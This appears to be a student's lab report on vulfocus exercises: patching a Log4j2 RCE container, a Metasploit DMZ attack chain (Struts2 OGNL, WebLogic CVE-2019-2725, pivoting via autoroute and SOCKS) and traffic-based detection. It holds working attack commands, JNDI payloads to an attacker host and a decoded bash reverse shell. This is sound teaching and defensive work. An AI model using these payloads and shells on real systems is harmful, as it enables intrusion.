  /bin/sh -c "java ${JAVA_OPTS} -jar /demo/demo.jar"
```

![1742743055555](image/网络安全丁梦/1742743055555.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker run -d --name objective_driscoll \
  -e JAVA_OPTS="-Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true" \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  /bin/sh -c "java ${JAVA_OPTS} -jar /demo/demo.jar"
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
bfca568f93133cae399687bb3b1978a3aecad223df2fa4dabb4b7fdead10c954
```

3. **验证JVM参数是否生效**

```bash
docker exec objective_driscoll ps aux | grep java
```

![1742743110532](image/网络安全丁梦/1742743110532.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker exec objective_driscoll ps aux | grep java
root           1  0.0  0.6 230684 13300 ?        Ssl  15:17   0:00 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /bin/sh /bin/sh -c java  -jar /demo/demo.jar
root           8 95.3 21.4 4087404 432784 ?      Sl   15:17   0:41 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /usr/bin/java java -jar /demo/demo.jar
```

通过ps aux命令查看进程状态，可以发现：

```bash
root           1  0.0  0.6 230684 13300 ?        Ssl  15:17   0:00 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /bin/sh /bin/sh -c java  -jar /demo/demo.jar
root           8 95.3 21.4 4087404 432784 ?      Sl   15:17   0:41 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /usr/bin/java java -jar /demo/demo.jar
```

这表明：

JVM安全参数未被正确应用到Java命令中
容器通过QEMU进行x86_64到ARM64的二进制转译执行
环境变量展开可能在QEMU转译过程中出现问题

```bash
# 重新启动容器，直接在命令行中添加安全参数
docker run -d --name objective_driscoll \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true -jar /demo/demo.jar
```

![1742743540032](image/网络安全丁梦/1742743540032.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker run -d --name objective_driscoll \
  -p 40615:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true -jar /demo/demo.jar
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
084815a8e54d2df4be58335c743c8934b065dcc73ae32d4dbdaafe014eff6b62
                                                                                
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker exec objective_driscoll ps aux | grep java
root           1 91.8 10.9 3717788 221836 ?      Ssl  15:24   0:10 /usr/libexec/qemu-binfmt/x86_64-binfmt-P /usr/bin/java java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false -Dlog4j2.disableJndi=true -jar /demo/demo.jar
```

从输出中可以看到：

安全参数成功应用 - 所有三个关键参数 `(-Dlog4j2.formatMsgNoLookups=true、-Dcom.sun.jndi.ldap.object.trustURLCodebase=false和-Dlog4j2.disableJndi=true)`现在都出现在Java进程的命令行中。

QEMU转译执行 - 进程是通过 `/usr/libexec/qemu-binfmt/x86_64-binfmt-P`在ARM64主机上运行x86_64二进制文件。注意命令行中同时出现了java和参数之前的java，这是QEMU转译的特殊情况。

架构转译特性 - 进程使用了大量内存(3717788 KB ≈ 3.7GB)，CPU使用率也较高(91.8%)，这是由于架构转译带来的额外开销。

改进总结

1. 直接命令行参数vs环境变量：在跨架构容器中，直接在命令行中指定JVM参数比通过环境变量更可靠，因为环境变量可能在QEMU转译层中丢失或未正确传递。
2. 验证参数应用：通过ps aux命令查看进程参数是确认安全缓解措施是否生效的关键步骤，不应该省略。
3. 跨架构注意事项：在ARM64上运行x86_64容器时，性能会有所下降，且某些行为可能与原生架构有所不同，这需要在实际操作和排错中特别注意。

这种方法成功应用了所有安全参数，有效缓解了Log4j漏洞，即使在跨架构环境中也能正常工作


---

### 六. 漏洞修复

#### 第一次尝试（失败）

首先，确认目标容器的运行状态：

```bash
docker ps
```

输出显示：

![1742746825326](image/网络安全丁梦/1742746825326.png)

永久修复方案 - 移除 JndiLookup 类

这个修复方案通过从 log4j-core 包中移除 JndiLookup 类来完全禁用 JNDI 查找功能，从而永久修复漏洞。

##### 进入容器执行修复操作

```bash
# 进入容器
docker exec -it xenodochial_panini /bin/bash

# 安装必要工具
apt-get update && apt-get install -y zip unzip
```

![1742746878666](image/网络安全丁梦/1742746878666.png)

##### 创建工作目录并准备环境

```bash
# 创建临时工作目录
mkdir -p /tmp/jar-fix
cd /tmp/jar-fix

# 复制并解压主应用 jar 文件
cp /demo/demo.jar ./
unzip demo.jar
```

![1742746908978](image/网络安全丁梦/1742746908978.png)

```bash
# 查找 log4j 相关的 jar 文件
find BOOT-INF/lib -name "*log4j*.jar"
```

![1742746937561](image/网络安全丁梦/1742746937561.png)

##### 修改 log4j-core 库以移除 JndiLookup 类

```bash
# 创建子目录处理 log4j-core jar
mkdir log4j-fix
cd log4j-fix

# 复制并解压 log4j-core
cp ../BOOT-INF/lib/log4j-core-2.14.0.jar ./
unzip log4j-core-2.14.0.jar
```

![1742746961127](image/网络安全丁梦/1742746961127.png)

```bash
# 删除 JndiLookup 类 - 这是漏洞的根源
rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class

# 验证类文件已被删除
ls -la org/apache/logging/log4j/core/lookup/JndiLookup.class 2>/dev/null || echo "已成功删除 JndiLookup 类"

```

![1742747026507](image/网络安全丁梦/1742747026507.png)

```bash
# 重新打包修改后的 jar 文件
jar -cf log4j-core-2.14.0-fixed.jar .

# 用修复版替换原始 jar 文件
cp log4j-core-2.14.0-fixed.jar ../BOOT-INF/lib/log4j-core-2.14.0.jar

# 返回主目录
cd /tmp/jar-fix
```

![1742747046958](image/网络安全丁梦/1742747046958.png)

##### 重新打包修复后的应用 JAR

```bash
# 重新打包整个应用
jar -cfM fixed-demo.jar META-INF BOOT-INF org

# 备份原始应用
cp /demo/demo.jar /demo/demo.jar.bak

# 替换为修复后的应用
cp fixed-demo.jar /demo/demo.jar

# 设置正确的权限
chmod 644 /demo/demo.jar

# 清理临时文件
cd /
rm -rf /tmp/jar-fix
```

![1742747064377](image/网络安全丁梦/1742747064377.png)

##### 退出容器并重启应用使修复生效

```bash
# 退出容器
exit

# 重启容器应用修复
docker restart xenodochial_panini

# 检查容器是否成功重启
docker ps
```

出现问题：objective_driscoll重启失败

![1742746721620](image/网络安全丁梦/1742746721620.png)

分析容器启动失败的原因

```bash
# 查看日志
docker logs xenodochial_panini
```

![1742746738905](image/网络安全丁梦/1742746738905.png)

通过分析 Docker 容器日志，我发现了容器启动失败的具体原因：

#### 错误分析

###### 从日志中可以看出，应用最初成功启动了（Spring Boot banner和初始化消息正常），但在重启时出现了严重错误：

```
Exception in thread "main" java.lang.IllegalStateException: Failed to get nested archive for entry BOOT-INF/lib/spring-boot-starter-2.1.3.RELEASE.jar
...
Caused by: java.lang.IllegalStateException: Unable to open nested entry 'BOOT-INF/lib/spring-boot-starter-2.1.3.RELEASE.jar'. It has been compressed and nested jar files must be stored without compression. Please check the mechanism used to create your executable jar file
```

###### 根本原因

这个错误是由修改和重新打包JAR文件的方式导致的：

1. **压缩问题**：Spring Boot要求嵌套JAR文件（BOOT-INF/lib/中的依赖）必须不压缩存储，但的重新打包过程压缩了这些文件
2. **JAR结构破坏**：使用的 `jar -cfM`命令没有保留Spring Boot加载器所需的特殊结构

###### 重要的命令分析

```bash
jar -cfM fixed-demo.jar META-INF BOOT-INF org
```

这个命令中：

- `-c` - 创建新归档
- `-f` - 指定输出文件
- `-M` - 不创建MANIFEST文件

但缺少了关键的 `-0`（零）标志，该标志会指定"仅存储 - 不压缩"。

###### 解决方案

经验教训

1. **Spring Boot JAR修改复杂**：Spring Boot可执行JAR有特殊结构，不能用标准JAR工具简单修改

#### 第二次尝试（失败）

##### 修复 Log4j 漏洞 - 正确重新打包 JAR 文件

##### 1. 进入容器并准备环境

```bash
# 进入容器
docker exec -it infallible_mccarthy /bin/bash

# 安装必要工具
apt-get update && apt-get install -y zip unzip
```

![1742776055940](image/网络安全丁梦/1742776055940.png)

##### 2. 创建工作目录

```bash
# 创建临时工作目录
mkdir -p /tmp/jar-fix
cd /tmp/jar-fix
```

##### 3. 定位并修复 log4j-core 库

```bash
# 复制原始 JAR 以便进行修改
cp /demo/demo.jar ./original-demo.jar

# 找出包含 log4j-core 的路径
jar -tf original-demo.jar | grep log4j-core
```

![1742776231063](image/网络安全丁梦/1742776231063.png)

BOOT-INF/lib/log4j-core-2.14.0.jar

```bash
# 提取单个 JAR 文件
jar -xf original-demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar

# 创建临时目录以修改 log4j-core
mkdir log4j-fix
cd log4j-fix

# 解压 log4j-core JAR
jar -xf ../BOOT-INF/lib/log4j-core-2.14.0.jar

# 删除 JndiLookup 类
rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class

# 确认删除成功
ls -la org/apache/logging/log4j/core/lookup/JndiLookup.class 2>/dev/null || echo "已成功删除 JndiLookup 类"

# 重新创建 log4j-core JAR（使用 -0 不压缩）
jar -cf0 ../BOOT-INF/lib/log4j-core-2.14.0.jar .

# 返回上一级目录
cd ..
```

![1742776305333](image/网络安全丁梦/1742776305333.png)

##### 4. 使用适当方法修改 Spring Boot JAR

对于 Spring Boot 应用，最安全的方法是：

```bash
# 创建新目录存放修改后的 JAR 文件
mkdir fixed-jar
cp original-demo.jar fixed-jar/demo.jar

# 备份原始文件
cp /demo/demo.jar /demo/demo.jar.backup

# 复制修复后的 log4j-core 到原始 JAR
cd fixed-jar
mkdir -p BOOT-INF/lib/
cp ../BOOT-INF/lib/log4j-core-2.14.0.jar BOOT-INF/lib/

# 使用 zip 命令更新 JAR 中的文件（不更改其他结构）
zip -u demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar

# 将修复后的 JAR 替换原始文件
cp demo.jar /demo/demo.jar
```

![1742776356148](image/网络安全丁梦/1742776356148.png)

##### 5. 退出容器并重启应用

```bash
# 退出容器
exit

# 重启容器
docker restart infallible_mccarthy

```

1. **使用 -0 标志**：确保 JAR 文件内容存储而不压缩
2. **使用 zip -u 更新**：只替换特定文件，保持其他结构不变
3. **最小化修改范围**：只替换有问题的 log4j-core JAR，不重建整个应用 JAR

![1742776669629](image/网络安全丁梦/1742776669629.png)

容器启动失败，分析原因

容器成功启动（从 Spring Boot 的启动横幅和初始化信息可以看出）
它运行了一段时间，并且至少处理了一个请求（能看到在 00:25:06 时的日志记录）
在 00:32:49 时，某些情况触发了应用程序的关闭
当尝试重新启动时，修改后的 JAR 文件结构导致了失败

#### 第三次尝试（成功）

尝试以下确保正确保留 JAR 文件结构的方法：

![1742795856678](image/网络安全丁梦/1742795856678.png)

```bash
# 从原始镜像启动一个新容器
# 进入容器
docker exec -it musing_lichterman /bin/bash

# 在容器内，安装所需工具并修复 JAR 文件
apt-get update && apt-get install -y zip unzip

# 仅提取 log4j-core JAR 文件
cd /tmp
mkdir fix
cd fix
cp /demo/demo.jar ./
unzip -p demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar > log4j-core.jar

# 修复 log4j-core JAR 文件
mkdir core
cd core
unzip ../log4j-core.jar
rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class
zip -0 -r ../fixed-log4j-core.jar .

# 更新原始 JAR 文件，不进行重新压缩
cd ..
cp demo.jar demo.jar.original
printf "UEsDBAoAAAAAAA" | dd of=fixed-log4j-core.jar bs=1 count=12 conv=notrunc
zip -0 demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar

# 替换原始 JAR 文件
cp demo.jar /demo/demo.jar
```

![1742796050462](image/网络安全丁梦/1742796050462.png)

完成这些步骤后，重启容器：

```bash
exit

docker restart musing_lichterman
```

![1742796019570](image/网络安全丁梦/1742796019570.png)

启动成功

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker restart musing_lichterman

musing_lichterman
                                                                                                                   
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker ps               
CONTAINER ID   IMAGE                              COMMAND                  CREATED         STATUS                   PORTS                                         NAMES
7789812eb21b   vulfocus/log4j2-rce-2021-12-09:1   "java -jar /demo/dem…"   3 minutes ago   Up 7 seconds             0.0.0.0:47147->8080/tcp, :::47147->8080/tcp   musing_lichterman
f1dbefb28904   vulfocus/vulfocus:latest           "sh /vulfocus-api/ru…"   2 weeks ago     Up 4 minutes (healthy)   0.0.0.0:80->80/tcp, :::80->80/tcp             vulfocus_vul-focus_1
```

这种方法的关键区别在于：

始终使用 -0 标志以避免压缩
使用 printf "UEsDBAoAAAAAAA" | dd of=fixed-log4j-core.jar bs=1 count=12 conv=notrunc 来确保正确的 ZIP 头部
仅对必要的部分进行最小限度的修改

#### 6.验证Log4j漏洞修复

##### 1. 设置验证环境

首先，确保的攻击环境已准备就绪：

```bash
# 在攻击者机器上（10.37.132.3）
# 启动JNDI服务器
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.37.132.3

# 在攻击者机器的另一个终端中
# 启动监听器以接收潜在的回调
nc -lvnp 9999
```

##### 2. 测试漏洞

发送一个与利用时使用的测试负载类似的请求：

```bash
# 发送带有JNDI查找的测试负载
curl -X GET "http://10.37.133.3:47147/hello?payload=  \${jndi:ldap://10.37.132.3:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZXN0X2V4cGxvaXQK}"
```

如果执行此负载，它将尝试在 `/tmp/test_exploit`处创建一个文件。

##### 如何验证：

```bash
# 检查应用程序是否仍能正常运行（应返回正常响应）
curl -X GET "http://10.37.133.3:47147/hello?payload=\${jndi:ldap://10.37.132.3:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZXN0X2V4cGxvaXQK}"
```

![1742796931976](image/网络安全丁梦/1742796931976.png)

```bash
# 连接到容器以检查利用命令是否被执行
docker exec -it musing_lichterman /bin/bash
ls -la /tmp/test_exploit  # 如果修复有效，此文件不应存在
```

![1742796893667](image/网络安全丁梦/1742796893667.png)

##### 额外验证：

检查应用程序日志以获取修复的证据：

```bash
# 查看应用程序日志
docker logs musing_lichterman | grep -i jndi
```

![1742796975349](image/网络安全丁梦/1742796975349.png)

##### Log4j 漏洞修复验证分析

###### 日志分析结果

通过 `docker logs musing_lichterman | grep -i jndi`命令输出的结果，可以清晰地看到漏洞修复成功的证据：

###### 关键发现

1. **JNDI表达式被当作普通文本处理**

   ```
   2025-03-24 06:03:43.896 ERROR 1 --- [nio-8080-exec-1] c.e.l.Log4j2RceApplication : $jndi:ldap://10.37.132.3:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNrZWQK
   ```

   注意表达式以 `$jndi` 而不是 `${jndi}` 形式出现，这表明表达式没有被解析执行。
2. **多次攻击尝试均无效**
   日志显示在6:03、6:13和6:14时间点有多次攻击尝试，但所有请求都只是被当作普通字符串记录下来。
3. **应用正常运行**
   服务器在收到攻击请求后继续正常运行，没有出现崩溃或异常行为。
4. **没有LDAP连接尝试**
   没有任何日志表明系统尝试进行LDAP连接或执行Base64编码的命令。

###### 综合结论

漏洞修复已经成功实施：

1. 成功移除了 `JndiLookup`类，完全禁用了JNDI查找功能
2. 攻击载荷被当作普通文本处理，不会触发任何代码执行
3. 即使面对多次攻击尝试，应用也保持稳定运行
4. 日志中清晰记录了攻击尝试但没有执行危险操作

这种通过直接从JAR包中移除有问题的类文件的修复方法比简单的配置参数调整更彻底，为应用提供了永久性的保护，防止此类漏洞被利用。

---


## PART4 遇到的问题

### 问题一 : 环境搭建问题

#### ARM64系统运行x86_64架构容器问题

**问题描述**：在ARM64架构的Mac上运行vulfocus容器(x86_64架构)时出现`exec /bin/sh: exec format error`错误，导致容器启动后立即退出。

**解决方案**：
- 安装QEMU用户态模拟工具：`sudo apt-get install qemu-user-static`
- 配置多架构支持：`sudo docker run --privileged --rm tonistiigi/binfmt --install all`
- 在Docker Compose中指定平台：添加`platform: linux/amd64`参数
- 验证跨架构支持：`docker run --platform linux/amd64 --rm -it alpine:latest sh -c "uname -m"`

---

### 问题二 : 漏洞缓解阶段问题

#### JVM安全参数未正确应用

**问题描述**：通过环境变量方式添加Log4j安全参数时，参数未能正确传递到Java进程。

**原因**：在QEMU跨架构模拟环境中，环境变量展开存在问题。

**解决方案**：
- 避免使用环境变量传递参数
- 直接在命令行中添加安全参数：
  ```bash
  docker run -d --name objective_driscoll -p 40615:8080 vulfocus/log4j2-rce-2021-12-09:1 \
  java -Dlog4j2.formatMsgNoLookups=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=false \
  -Dlog4j2.disableJndi=true -jar /demo/demo.jar
  ```
- 验证参数是否应用：`docker exec objective_driscoll ps aux | grep java`

---

### 问题三 : 漏洞修复阶段问题

#### 第一次尝试修复失败

**问题描述**：修改JAR文件后容器无法启动，出现`IllegalStateException: Unable to open nested entry ...has been compressed`错误。

**原因**：Spring Boot要求嵌套JAR文件必须以不压缩方式存储，`jar -cfM`命令破坏了结构。

#### 第二次尝试修复失败

**问题描述**：即使使用`-0`不压缩标志，容器仍然启动失败。

**原因**：修改方式仍然破坏了Spring Boot JAR的特殊结构。

#### 第三次尝试成功

**成功解决方案**：
1. 从容器中提取log4j-core JAR文件：
   ```bash
   unzip -p demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar > log4j-core.jar
   ```

2. 修复log4j-core JAR (移除JndiLookup类)：
   ```bash
   mkdir core && cd core
   unzip ../log4j-core.jar
   rm -f org/apache/logging/log4j/core/lookup/JndiLookup.class
   zip -0 -r ../fixed-log4j-core.jar .
   ```

3. 正确更新原始JAR文件：
   ```bash
   printf "UEsDBAoAAAAAAA" | dd of=fixed-log4j-core.jar bs=1 count=12 conv=notrunc
   zip -0 demo.jar BOOT-INF/lib/log4j-core-2.14.0.jar
   ```

4. 替换并重启：
   ```bash
   cp demo.jar /demo/demo.jar
   docker restart musing_lichterman
   ```

#### 总结一下

1. **跨架构容器运行**：
   - 在ARM64上运行x86_64容器需要QEMU模拟支持
   - 跨架构容器会有性能开销(高CPU和内存使用)
   - 某些行为可能与原生架构有差异

2. **Java安全参数传递**：
   - 在跨架构环境中，直接命令行指定参数比环境变量更可靠
   - 务必验证参数是否生效，不仅依赖于容器是否启动成功

3. **Spring Boot JAR修改**：
   - Spring Boot JAR具有特殊结构，不能简单用标准JAR工具重新打包
   - 修改嵌套JAR时必须使用不压缩(-0)选项
   - 需要保留正确的ZIP文件头部信息
   - 最小化修改原则，只替换必要的文件

4. **漏洞修复验证**：
   - 重启后验证应用正常运行
   - 进行攻击测试验证修复有效性
   - 检查日志确认JNDI表达式被当作普通文本处理- 验证参数是否应用：`docker exec objective_driscoll ps aux | grep java`

---

### 问题四

#### 问题描述

在进行curl命令时 : 
```bash
curl -X GET "http://192.168.56.103:8080/hello?payload=\${jndi:ldap://chloris.check4safe.top/exp}"
```
有如下报错:
```
zsh: unrecognized modifier
```

这个报错是由于 `zsh` shell 对 `${}` 语法有特殊的解释方式，而 `${jndi:ldap://chloris.check4safe.top}` 被 `zsh` 解释为一个变量或特殊语法，导致 `zsh` 无法识别。

在 `zsh` 中，`${}` 是用于变量扩展或特殊字符处理的语法。因此，直接在命令行中使用 `${jndi:...}` 时，`zsh` 会尝试将其解释为一个变量或特殊语法，但由于 `jndi:...` 不是一个有效的变量或语法，所以会报错

#### 解决方法

##### 方法 1：使用单引号包裹参数
将 `${jndi:...}` 用单引号包裹起来，防止 `zsh` 解释它：
```bash
curl -G --data-urlencode 'payload=${jndi:ldap://chloris.check4safe.top}' http://192.168.20.6:23509/hello -vv
```

##### 方法 2：使用双引号并转义 `$`
在双引号中，使用反斜杠 `\` 转义 `$`，防止 `zsh` 解释它：
```bash
curl -G --data-urlencode "payload=\${jndi:ldap://chloris.check4safe.top}" http://192.168.20.6:23509/hello -vv
```

##### 方法 3：切换到 `bash` shell
如果不想修改命令，可以临时切换到 `bash` shell，因为 `bash` 对 `${}` 的解释方式与 `zsh` 不同：
```bash
bash
curl -G --data-urlencode "payload=${jndi:ldap://chloris.check4safe.top}" http://192.168.20.6:23509/hello -vv
```

## dmz实验部分

# DMZ攻击流程及入口漏洞缓解
## 实验环境

- kali
- msfconsole
- vulfocus

## 实验内容

### 一. 在 victim 上进行 DMZ 环境搭建
1. 按照要求拉取三个镜像
```
vulfocus/weblogic-cve_2019_2725
vulfocus/struts2-cve_2020_17530:latest
vulshare/nginx-php-flag
```
![alt text](img/img1/image/image.png)

![alt text](img/img1/image/image-1.png)

![alt text](img/img1/image/image-2.png)

启动vulfocus

![alt text](img/img1/image/image-3.png)

2.需要用到的第一个原镜像不好导入，可以从老师给的地方拉取镜像并导入vulfocus，其他镜像在vulfocus的 镜像管理->镜像管理 搜索栏处搜索对应名字并下载拉取，完成后将镜像均一键导入vulfocus中。

![alt text](img/img1/image/image-4.png)

![alt text](img/img1/image/image-5.png)

![alt text](img/img1/image/image-6.png)

![alt text](img/img1/image/image-7.png)

3.在场景管理->环境编排管理中创建新的场景如下，之后点击保存并发布，启动场景。

![alt text](img/img1/image/image-8.png)

![alt text](img/img1/image/image-9.png)

场景启动后，访问网页发现可以访问成功（注意访问地址的前面的ip地址有bug，需要更换为自己的ip地址）同时可以用docker ps查看发现多出了许多的容器。

![alt text](img/img1/image/image-10.png)

![alt text](img/img1/image/image-11.png)

![alt text](img/img1/image/image-12.png)

捕获指定容器的上下行流量，准备抓包
![捕获流量](img/img2/pics/捕获指定容器的上下行流量.png)

### 二. 攻破入口靶标
1. metasploit 基础配置
```
# 更新 metasploit
sudo apt install -y metasploit-framework
```

![更新](img/img2/pics/更新%20metasploit.png)

初始化metasploit本地工作数据库
![初始化metasploit](img/img2/pics/初始化metasploit本地工作数据库.png)

2. 利用struts2代码执行漏洞攻破入口

入口靶标页面如下。其中的端口号就是场景启动页面显示的。
![](img/img3/img/发现入口.png)

已知要利用的漏洞为 `struts2代码执行漏洞`，进行相关搜索搜索：
```
search structs2 type:exploit
```
![](img/structs2搜索.PNG)

使用合适的 exp payload
```
use exploit/multi/http/struts2_multi_eval_ognl
set payload payload/cmd/unix/reverse_bash

# 配置 exp 参数
set rhosts 192.168.56.119 
set rport 64617          
set lhost 192.168.56.113
```
![](img/img3/img/use_multieval.png)
可以show options来查看。
进行相关设置，rhosts设置成自己的虚拟机地址,lhosts、rhosts分别是靶机的ip和端口。`exploit -j`发送
![](img/img3/img/multieval设置.png)
创建了一个sessoin
![](img/img3/img/session1.png)
进入session1，ls/tmp发现第一个flag
![](img//img3/img/进入session1.png)

将上图中显示出的flag提交，可以发现成功，进度条涨至20%。

![alt text](img/img1/image/image-18.png)

### 三. 攻破内网第一层靶标
#### 建立立足点并发现靶标2-4

先将cmd shell升级至meterpreter shell

![alt text](img/img1/image/image-19.png)

通过sessions -i 3进入meterpreter会话，通过ipconfig等指令查看内网真实地址并建立相关路由。
```
run autoroute -s 192.170.84.0/24

# 检查 Pivot 路由是否已创建成功
run autoroute -p
#最后输入background使其挂到后台运行
```

![alt text](img/img1/image/image-20.png)

```
# portscan through pivot
search portscan
use auxiliary/scanner/portscan/tcp
show options
# 根据子网掩码推导
set RHOSTS 192.170.84.2-254
# 根据「经验」
set rport 7001
# 根据「经验」
set threads 10
#（下图中的上述相关配置过程未截图，设置完毕后可通过show options查看确认正确性）
exploit
```

![alt text](img/img1/image/image-21.png)

```
# 等到扫描结果 100%
# 查看主机存活情况
hosts

# 查看发现的服务列表
services
```

![alt text](img/img1/image/image-22.png)

```
# setup socks5 proxy 
search socks_proxy
use auxiliary/server/socks_proxy
run -j
```

![alt text](img/img1/image/image-23.png)

新打开一个命令行ssh连接攻击者主机，检查 1080 端口服务开放情况：sudo lsof -i tcp:1080 -l -n -P

![alt text](img/img1/image/image-24.png)

安装下载proxychains4。

![alt text](img/img1/image/image-25.png)

安装后发现配置文件缺失，不能成功启动proxychains4。使用sudo vim /etc/proxychains4.conf手动创建配置文件。输入以下内容：
```
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Add your proxy settings here
# Example:
# socks5 127.0.0.1 1080
```

同时确保配置文件有正确的权限，以便 proxychains4 可以读取它：`sudo chmod 644 /etc/proxychains4.conf`，随后可以正常使用。
输入`sudo vim /etc/proxychains4.conf`，更改配置文件，并执行`proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.170.84.2-5`。

![alt text](img/img1/image/image-26.png)

![alt text](img/img1/image/image-27.png)

重新回到metasploit会话窗口。重新进入shell会话。

```
# 回到 metasploit 会话窗口
# 重新进入 shell 会话
sessions -i 1
curl http://192.170.84.2:7001 -vv
curl http://192.170.84.3:7001 -vv
curl http://192.170.84.4:7001 -vv
```

![alt text](img/img1/image/image-28.png)

出现404错误，说明网络层联通，但应用层请求了一个不存在的地址。

#### 攻破靶标2-4，并获得flag
已知拓扑中三台主机均存在cve-2019-2725漏洞，因此选择利用它。

```
# search exploit
search cve-2019-2725

# getshell
use 0
show options
set RHOSTS 192.170.84.2
# 分别设置不同的靶机 IP （一共需要设置三次）
set lhost 192.168.56.108
# 分别 run（一共要run三次）
run -j

# get flag2-4
sessions -c "ls /tmp" -i 3,4,5
```

![alt text](img/img1/image/image-29.png)

![alt text](img/img1/image/image-30.png)

成功得到三个flag，提交至vulfocus搭建的环境中，进度涨至80%。

![alt text](img/img1/image/image-31.png)
### 四. 攻破DMZ内网第二层靶标
#### 1. 发现终点靶标
```
# 通过网卡、路由、ARP 发现新子网 192.169.85.0/24
sessions -c "ifconfig" -i 5,6,7
```

![alt text](img/img1/image/image-32.png)

由结果可以发现新子网存在于会话7中，我们将会话7升级为meterpreter shell

```
# 将会话 7 升级为 meterpreter shell
sessions -u 7
# 新的 meterpreter shell 会话编号此处为 8
sessions -i 8
# 将新发现的子网加入 Pivot Route
run autoroute -s 192.169.85.0/24
run autoroute -p
#通过 background指令将其推至后台运行
```

![alt text](img/img1/image/image-33.png)

和之前一样，依然选择使用tcp来扫描，但注意要更改相关的配置，如扫描的端口等

```
use scanner/portscan/tcp
set RHOSTS 192.169.85.2-254
set ports 80
run 
#发现终点靶标 192.169.85.2.80(tcp)
```

![alt text](img/img1/image/image-34.png)

![alt text](img/img1/image/image-35.png)
#### 2. 拿到最终靶标上的flag
```
# 利用跳板机 192.170.84.3 的 shell 会话「踩点」最终靶标
sessions -c "curl http://192.169.85.2" -i 5
# 发现没安装 curl ，试试 wget
sessions -c "wget http://192.169.85.2" -i 5
# 发现没有命令执行回显，试试组合命令
sessions -c "wget http://192.169.85.2 -O /tmp/result && cat /tmp/result" -i 5
# 发现 get flag 提示
sessions -c "wget 'http://192.169.85.2/index.php?cmd=ls /tmp' -O /tmp/result && cat /tmp/result" -i 5
# index.php?cmd=ls /tmpflag-{bmh8f2e8555-eab8-43f9-8654-78c019607788}
```

![alt text](img/img1/image/image-36.png)

提交至vulfocus处，成功，至此最后的靶标5也被成功攻破。

![alt text](img/img1/image/image-37.png)

## 漏洞利用检测

### 1. DMZ入口靶标的漏洞利用检测

使用wireshark过滤规则`http`过滤相关数据包

![alt text](img/img1/image/35a8fc845f674ef809605ee887dd21e.png)

进行url解码后获得如下：
```
id=%25%7b%28%23instancemanager%3d%23application%5b%22org.apache.tomcat.InstanceManager%22%5d%29.%28%23stack%3d%23attr%5b%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5d%29.%28%23bean%3d%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3d%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3d%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3d%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2c%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2c%23emptyset%29%29.%28%23execute%3d%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%7b%22bash%20-c%20%7becho%2cYmFzaCAtYyAnMDwmMTA1LTtleGVjIDEwNTw%2bL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDgvNDQ0NDtzaCA8JjEwNSA%2bJjEwNSAyPiYxMDUn%7d%7c%7bbase64%2c-d%7d%7cbash%22%7d%29%29%7d
```

我们对其进行base64编码后获得：

`bash -c '0<&105-;exec 105<>/dev/tcp/192.168.56.108/4444;sh <&105 105>&105 2>&105'`

* 可以看到这是一个典型的 Bash 反弹 Shell（Reverse Shell） 命令，用于建立与攻击者机器的远程连接。

使用过滤规则：`ip.src == 192.168.56.108 && tcp.port== 4444`查看其相关执行的指令：

![alt text](img/img1/image/1742799464566.png)

我们再次追踪相关TCP数据流，可以看到我们之前在反弹shell试图获取flag时尝试的指令。可以看到**显示出的指令与我们之前攻破靶标过程中的是一样的**。

![alt text](img/img1/image/0f470a05fdf1cfc9cc537ae1b9b9138.png)





### 3.DMZ第一层靶标的漏洞利用检测
#### 方法一：抓包流量

过滤一下arp包可以看到有执行扫描192.170.84.x开放网口的记录，证明攻击者在尝试扫描网段上开放的主机。

